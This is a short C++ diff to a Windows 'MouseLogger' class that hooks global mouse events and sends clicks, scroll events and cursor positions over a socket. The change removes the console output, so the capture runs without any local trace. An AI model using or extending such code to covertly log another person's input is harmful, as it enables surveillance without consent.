@@ -32,7 +32,6 @@ void MouseLogger::recordMouseClicks(SOCKET sock)
 			msg = "<scroll-click>";
 		}
 
-		std::cout << msg;
 		send(sock, msg.c_str(), msg.length(), 0);
 	}
 }
@@ -59,7 +58,6 @@ LRESULT CALLBACK MouseLogger::startListen(int nCode, WPARAM wParam, LPARAM lPara
 		}
 	}
 
-	std::cout << scroll_event;
 	send(_mouseSock, scroll_event.c_str(), scroll_event.length(), 0);
 	return CallNextHookEx(_globalMouseHook, nCode, wParam, lParam);
 }
@@ -101,7 +99,6 @@ void MouseLogger::recordMousePos(SOCKET sock)
 
 			msg = "<" + std::to_string(currPos.x) + "x" + std::to_string(currPos.y) + ">";
 
-			std::cout << msg;
 			send(sock, msg.c_str(), msg.length(), 0);
 			Sleep(10);
 		}
